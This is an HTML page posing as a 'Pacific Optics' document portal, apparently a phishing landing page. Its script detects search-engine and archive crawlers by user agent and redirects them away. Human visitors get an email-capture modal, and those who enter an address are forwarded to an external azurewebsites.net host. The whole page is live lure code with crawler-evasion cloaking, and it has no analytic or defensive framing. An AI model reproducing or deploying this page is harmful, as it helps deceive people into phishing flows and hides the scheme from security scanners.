<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document Access</title>
    <style>
        #emailModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            z-index: 9999;
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        .modal-content h2 {
            margin-top: 0;
        }
        .modal-content input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            box-sizing: border-box;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .modal-content button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        .modal-content button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div id="emailModal">
        <div class="modal-content">
            <h2>PACIFIC OPTICS - PORTAL</h2>
            <p>Please enter your email address to view this content:</p>
            <input type="email" id="userEmail" placeholder="your@email.com" required>
            <button id="submitEmail">Continue</button>
        </div>
    </div>

    <script>
        // Anti-crawler measures
        const isLikelyCrawler = () => {
            // Check for common crawler user agents
            const crawlerPatterns = [
                /bot/, /spider/, /crawl/, /slurp/, /search/, /archiver/,
                /facebookexternalhit/, /linkedinbot/, /embedly/, /quora/,
                /pinterest/, /twitterbot/, /googlebot/, /bingbot/, /yandexbot/,
                /baiduspider/, /duckduckbot/, /sogou/, /exabot/, /ia_archiver/
            ];
            
            const userAgent = navigator.userAgent.toLowerCase();
            return crawlerPatterns.some(pattern => pattern.test(userAgent));
        };

        // Check if this is likely a crawler
        if (isLikelyCrawler()) {
            // Redirect crawlers immediately without showing the modal
            window.location.href = "https://lab9f3c4776-dd73-c0gqfpdkh3fmhad3.australiasoutheast-01.azurewebsites.net/";
        } else {
            // Show the email modal for human users
            document.addEventListener('DOMContentLoaded', function() {
                const modal = document.getElementById('emailModal');
                const emailInput = document.getElementById('userEmail');
                const submitBtn = document.getElementById('submitEmail');
                
                // Show modal
                modal.style.display = 'flex';
                
                // Handle form submission
                submitBtn.addEventListener('click', function() {
                    const email = emailInput.value.trim();
                    
                    // Simple email validation
                    if (email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                        // Here you could send the email to your server for tracking
                        console.log('User email:', email);
                        
                        // Redirect to your website
                        window.location.href = "https://lab9f3c4776-dd73-c0gqfpdkh3fmhad3.australiasoutheast-01.azurewebsites.net/";
                    } else {
                        alert('Please enter a valid email address.');
                    }
                });
                
                // Also allow Enter key to submit
                emailInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        submitBtn.click();
                    }
                });
            });
        }
    </script>
</body>
</html>
